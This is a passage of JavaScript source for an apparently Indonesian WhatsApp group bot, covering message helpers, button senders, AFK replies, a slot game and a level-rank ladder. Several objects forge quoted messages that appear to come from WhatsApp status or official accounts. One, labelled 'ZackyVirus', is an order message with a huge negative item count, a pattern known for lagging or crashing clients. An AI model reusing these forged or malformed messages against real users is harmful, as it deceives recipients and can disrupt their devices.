			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isPrem = prem.includes(sender)
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const isAntiLinkTelegram = isGroup ? antitelegram.includes(from) : false
			const isAntiLinkig = isGroup ? antilinkig.includes(from) : false
            const isAntiLinkfb = isGroup ? antilinkfb.includes(from) : false
			const isAntiLinkytc = isGroup ? antilinkytc.includes(from) : false
            const isAntiLinkytv = isGroup ? antilinkytv.includes(from) : false
			const isBadWord = isGroup ? badword.includes(from) : false
            const isAntiFirtex = isGroup ? antifirtex.includes(from) : false
            const isRekvir = isGroup ? rekap.includes(from) : false            			
			const isBanned = ban.includes(sender)		
			const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''		
			const isGroupToxic = linkRegex.exec(m.text)			
			totalchat = await zacky.chats.all()
			const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${tampilHari},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./lib/◇.jpeg'), thumbnail:fs.readFileSync('./lib/◇.jpeg'),sendEphemeral: true}}}	
			const fkon = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) }, message: { "contactMessage": { "displayName": `${NamaOwner}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${NamaOwner},;;;\nFN:${NamaBot},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": fs.readFileSync('./lib/◇.jpeg')}}}
			const fdoc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fakedoc, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/♡.jpeg')}}}
            const forwd = { forwardingScore: 1000, isForwarded: true }
			const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": command, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/♡.jpeg')} } }
			const btrai = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": btre, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/♡.jpeg')} } }
			const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./lib/♡.jpeg`)}, "title": faketoko, "description": "ManikGanz", "currencyCode": "USD", "priceAmount1000": "69000000000", "retailerId": "ManikGanz", "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
			const fitem = { key: { fromMe: false, participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {}) }, message: {"orderMessage" : {"orderId":"174238614569481","thumbnail":fs.readFileSync('lib/♡.jpeg'),"itemCount": 2021 ,"status":"INQUIRY","surface":"CATALOG","message":`⏳Run Time : ${kyun(uptime)}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}
			fwelcome = { key: { fromMe: false, participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {}) }, message: {"orderMessage" : {"orderId":"174238614569481","thumbnail":fs.readFileSync('lib/♡.jpeg'),"itemCount": groupMembers.length ,"status":"INQUIRY","surface":"CATALOG","message":`⏳Run Time : ${kyun(uptime)}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}			
			const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${NamaBot}`,jpegThumbnail: fs.readFileSync(`./lib/♡.jpeg`)}}}
			const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${NamaBot}`, "h": `Hmm`,'seconds': '99999', 'caption': `${NamaBot}`, 'jpegThumbnail': fs.readFileSync(`./lib/♡.jpeg`)}}}
			const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
			const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${NamaBot}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${NamaBot}`, 'jpegThumbnail': fs.readFileSync(`./lib/♡.jpeg`)}}}				
			const fgclink = { key: { participant: `0@s.whatsapp.net`,"remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "Group invite", "caption": `${fakegroup}`, 'jpegThumbnail': fs.readFileSync('lib/♡.jpeg')}}}						
			const fgroup = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./lib/♡.jpeg`)}, "title": fakegroup, "description": "ManikGanz", "currencyCode": "USD", "priceAmount1000": "69000000000", "retailerId": "ManikGanz", "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
			const ftroli = { key: { participant: '0@s.whatsapp.net'}, message: {orderMessage: {thumbnail:fs.readFileSync('./lib/♡.jpeg'), itemCount: -969769349, status: 1, surface: 1, message: '☠️HengkerTyz☠️', orderTitle: 'ZackyVirus', sellerJid: '0@s.whatsapp.net'}}}
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}			
			const fakethumb = (teks, yes) => {
                zacky.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./lib/♡.jpeg'),quoted:mek,caption:yes})
            }
			const reply = (teks) => {
				zacky.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				zacky.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? zacky.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : zacky.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}								
			const listmsg = (from, title, desc, list) => { // Fixx
            let po = zacky.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "Jangan Lupa Donasi Ya Kak ☕","listType": "SINGLE_SELECT","sections": list}}, {})
            return zacky.relayWAMessage(po, {waitForAck: true})
            }
           const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       zacky.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       zacky.sendMessage(from, hasil, type, options).catch(e => {
	       zacky.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
	       })
	       })
	       })
	       })
	       }
	       
	       const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					zacky.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
	       	       	       	       
	       const katalog = (teks) => {
           res = zacky.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 666, "message": teks, "footerText": `${wib} WIB  ${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, "thumbnail": fs.readFileSync(`./lib/◇.jpeg`), "surface": 'CATALOG' }}, {quoted:freply})
           zacky.relayWAMessage(res)
           }
           
           const grupinv = (teks) => {
	       grup = zacky.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": fs.readFileSync(`./lib/◇.jpeg`), "caption": teks}}, {quoted:freply})
           zacky.relayWAMessage(grup)
	       }
	       
	       try {
		   ppimg = await zacky.getProfilePicture(`${sender.split('@')[0]}@c.us`)
		   } catch {
		   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		   }
		   fpp = await getBuffer(ppimg)
		   
		   bio = await zacky.getStatus(`${sender.split('@')[0]}@c.us`)		   
	       
	       //here button function
	       selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
           responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''           
           q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		   q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		   q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		   butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
           
			colors = ['red','white','black','blue','yellow','green']	 	    
	 	    //detector media
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')			
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')			
			const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')			
			
			//Private Chat			
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mPRIVATE\x1b[1;37m]', time, color(command), 'from', color(pushname, 'lime'), 'args :', color(args.length))
			if (!isGroup && !command) console.log(color('|MSG', 'greenyellow'), color('PRIVATE|', 'red'), time, color(cmd, 'cyan'), 'from', color(pushname, 'lime'))

			//Group Chat
            if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mGROUP\x1b[1;37m]', time, color(command), 'from', color(pushname, 'lime'), 'in', color(groupName, 'lime'), 'args :', color(args.length))
			//if (!command && isGroup) console.log(color('|MSG', 'greenyellow'), color('GROUP|', 'red'), time, color(cmd, 'cyan'), 'from', color(pushname, 'lime'), 'in', color(groupName, 'lime'))

const sendButton = async (from, context, fortext, but, mek) => {
        buttonMessages = {
        contentText: context,
        footerText: fortext,
        buttons: but,
        headerType: 1
        }
        zacky.sendMessage(from, buttonMessages, buttonsMessage, {
        quoted: troli
        })
        }

//Button Register
const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
zacky.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = ind.noregis()
const daftar2 = `Ketik Tombol Di Bawah Untuk Verify\n\n_© ${creator}_`
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `🔖 VERIFY `,},type: 1,},]
						    												    												    
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
zacky.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await zacky.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
zacky.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await zacky.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
zacky.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
        const buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
        return zacky.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
   
///Button Location MD
const sendButLocation2 = async (anu, text1, desc1, gam1, but = []) => {
res = await zacky.prepareMessageFromContent(from,{
    "templateMessage": {
      "hydratedTemplate": {
      	"locationMessage": {
						"degreesLatitude": 0,
						"degreesLongitude": 0,
						"jpegThumbnail": gam1
},
        "hydratedContentText": text1,
        "hydratedFooterText": desc1,
        "hydratedButtons": but
      }
    }
  }, { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true}})
zacky.relayWAMessage(res)
}

///Add command
for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}			   			
			
/*====================================================[ AFK ]======================================================================*/
 cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            zacky.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./lib/◇.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        zacky.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n┈───┅──┅──❀──┅──┅───┈\n*Alasan :* ${alasan}\n┈───┅──┅──❀──┅──┅───┈\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ "mentionedJid": [`${owner}`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./lib/◇.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    zacky.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
            fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     zacky.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync('./lib/◇.jpeg'), sendEphemeral: true, contextInfo:{mentionedJid:zacky.parseMention(ckck)}})
                }}}}})

        
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        zacky.sendMessage(from, `@${ment.split('@')[0]} Sedang AFK\n┈───┅──┅──❀──┅──┅───┈\n*Alasan :* ${getReason}\n┈───┅──┅──❀──┅──┅───┈\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu`, text, {quoted: mek})
                        zacky.sendMessage(ment, `Ada yang mencari anda saat anda offline\n┈───┅──┅──❀──┅──┅───┈\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{"mentionedJid": zacky.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
                    zacky.sendMessage(from, `@${sender.split('@')[0]} telah kembali dari AFK\n┈───┅──┅──❀──┅──┅───┈\n*Alasan :* ${getReason}\n┈───┅──┅──❀──┅──┅───┈\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik`, text, {quoted: fkontak, contextInfo:{"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true}})
                }
            
			    			    			    
/*====================================================[ GAME ]======================================================================*/                  	 
            const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
            const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
            const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
            const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
            const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
            const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
            const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
		    const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
		    const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
/*====================================================[ ROLE LEVELING ]==============================================================*/                    	  
 ManikRole = getLevelingLevel(sender)
   	     role = 'Newbie ㋡'
        if (ManikRole <= 2) {
            role = 'Newbie ㋡'
        } else if (ManikRole <= 4) {
            role = 'Beginner Tier1 ⚊¹'
        } else if (ManikRole <= 6) {
            role = 'Beginner Tier2 ⚊²'
        } else if (ManikRole <= 8) {
            role = 'Beginner Tier3 ⚊³'
        } else if (ManikRole <= 10) {
            role = 'Beginner Tier4 ⚊⁴'
        } else if (ManikRole <= 12) {
            role = 'Private Tier1 ⚌¹'
        } else if (ManikRole <= 14) {
            role = 'Private Tier2 ⚌²'
        } else if (ManikRole <= 16) {
            role = 'Private Tier3 ⚌³'
        } else if (ManikRole <= 18) {
            role = 'Private Tier4 ⚌⁴'
        } else if (ManikRole <= 20) {
            role = 'Private Tier5 ⚌⁵'
        } else if (ManikRole <= 22) {
            role = 'Corporal Tier1 ☰¹'
        } else if (ManikRole <= 24) {
            role = 'Corporal Tier2 ☰²'
        } else if (ManikRole <= 26) {
            role = 'Corporal Tier3 ☰³'
        } else if (ManikRole <= 28) {
            role = 'Corporal Tier4 ☰⁴'
        } else if (ManikRole <= 30) {
            role = 'Corporal Tier5 ☰⁵'
        } else if (ManikRole <= 32) {
            role = 'Sergeant Tier1 ≣¹'
        } else if (ManikRole <= 34) {
            role = 'Sergeant Tier2 ≣²'
        } else if (ManikRole <= 36) {
            role = 'Sergeant Tier3 ≣³'
        } else if (ManikRole <= 38) {
            role = 'Sergeant Tier4 ≣⁴'
        } else if (ManikRole <= 40) {
            role = 'Sergeant Tier5 ≣⁵'
        } else if (ManikRole <= 42) {
            role = 'Staff Tier1 ﹀¹'
        } else if (ManikRole <= 44) {
            role = 'Staff Tier2 ﹀²'
        } else if (ManikRole <= 46) {
            role = 'Staff Tier3 ﹀³'
        } else if (ManikRole <= 48) {
            role = 'Staff Tier4 ﹀⁴'
        } else if (ManikRole <= 50) {
            role = 'Staff Tier5 ﹀⁵'
        } else if (ManikRole <= 52) {
            role = 'Sergeant Tier1 ︾¹'
        } else if (ManikRole <= 54) {
            role = 'Sergeant Tier2 ︾²'
        } else if (ManikRole <= 56) {
            role = 'Sergeant Tier3 ︾³'
        } else if (ManikRole <= 58) {
            role = 'Sergeant Tier4 ︾⁴'
        } else if (ManikRole <= 60) {
            role = 'Sergeant Tier5 ︾⁵'
        } else if (ManikRole <= 62) {
            role = '2nd Lt. Tier1 ♢¹ '
        } else if (ManikRole <= 64) {
            role = '2nd Lt. Tier2 ♢²'
        } else if (ManikRole <= 66) {
            role = '2nd Lt. Tier3 ♢³'
        } else if (ManikRole <= 68) {
            role = '2nd Lt. Tier4 ♢⁴'
        } else if (ManikRole <= 70) {
            role = '2nd Lt. Tier5 ♢⁵'
        } else if (ManikRole <= 72) {
            role = '1st Lt. Tier1 ♢♢¹'
        } else if (ManikRole <= 74) {
            role = '1st Lt. Tier2 ♢♢²'
        } else if (ManikRole <= 76) {
            role = '1st Lt. Tier3 ♢♢³'
        } else if (ManikRole <= 78) {
            role = '1st Lt. Tier4 ♢♢⁴'
        } else if (ManikRole <= 80) {
            role = '1st Lt. Tier5 ♢♢⁵'
        } else if (ManikRole <= 82) {
            role = 'Major Tier1 ✷¹'
        } else if (ManikRole <= 84) {
            role = 'Major Tier2 ✷²'
        } else if (ManikRole <= 86) {
            role = 'Major Tier3 ✷³'
        } else if (ManikRole <= 88) {
            role = 'Major Tier4 ✷⁴'
        } else if (ManikRole <= 90) {
            role = 'Major Tier5 ✷⁵'
        } else if (ManikRole <= 92) {
            role = 'Colonel Tier1 ✷✷¹'
        } else if (ManikRole <= 94) {
            role = 'Colonel Tier2 ✷✷²'
        } else if (ManikRole <= 96) {
            role = 'Colonel Tier3 ✷✷³'
        } else if (ManikRole <= 98) {
            role = 'Colonel Tier4 ✷✷⁴'
        } else if (ManikRole <= 100) {
            role = 'Colonel Tier5 ✷✷⁵'
        } else if (ManikRole <= 102) {
            role = 'Brigadier Early ✰'
        } else if (ManikRole <= 104) {
            role = 'Brigadier Silver ✩'
        } else if (ManikRole <= 106) {
            role = 'Brigadier gold ✯'
        } else if (ManikRole <= 108) {
            role = 'Brigadier Platinum ✬'
        } else if (ManikRole <= 110) {
            role = 'Brigadier Diamond ✪'
        } else if (ManikRole <= 112) {
            role = 'Major General Early ✰'
        } else if (ManikRole <= 114) {
            role = 'Major General Silver ✩'
        } else if (ManikRole <= 116) {
            role = 'Major General gold ✯'
        } else if (ManikRole <= 118) {
            role = 'Major General Platinum ✬'
        } else if (ManikRole <= 120) {
            role = 'Major General Diamond ✪'
        } else if (ManikRole <= 122) {
            role = 'Lt. General Early ✰'
        } else if (ManikRole <= 124) {
            role = 'Lt. General Silver ✩'
        } else if (ManikRole <= 126) {
            role = 'Lt. General gold ✯'
        } else if (ManikRole <= 128) {
            role = 'Lt. General Platinum ✬'
        } else if (ManikRole <= 130) {
            role = 'Lt. General Diamond ✪'
        } else if (ManikRole <= 132) {
            role = 'General Early ✰'
        } else if (ManikRole <= 134) {
            role = 'General Silver ✩'
        } else if (ManikRole <= 136) {
            role = 'General gold ✯'
        } else if (ManikRole <= 138) {
            role = 'General Platinum ✬'
        } else if (ManikRole <= 140) {
            role = 'General Diamond ✪'
        } else if (ManikRole <= 142) {
            role = 'Commander Early ★'
        } else if (ManikRole <= 144) {
            role = 'Commander Intermediate ⍣'
        } else if (ManikRole <= 146) {
            role = 'Commander Elite ≛'
        } else if (ManikRole <= 148) {
            role = 'The Commander Hero ⍟'
        } else if (ManikRole <= 152) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 154) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 156) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 158) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 160) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 162) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 164) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 166) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 168) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 170) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 172) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 174) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 176) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 178) {
            role = 'Legends II 忍'
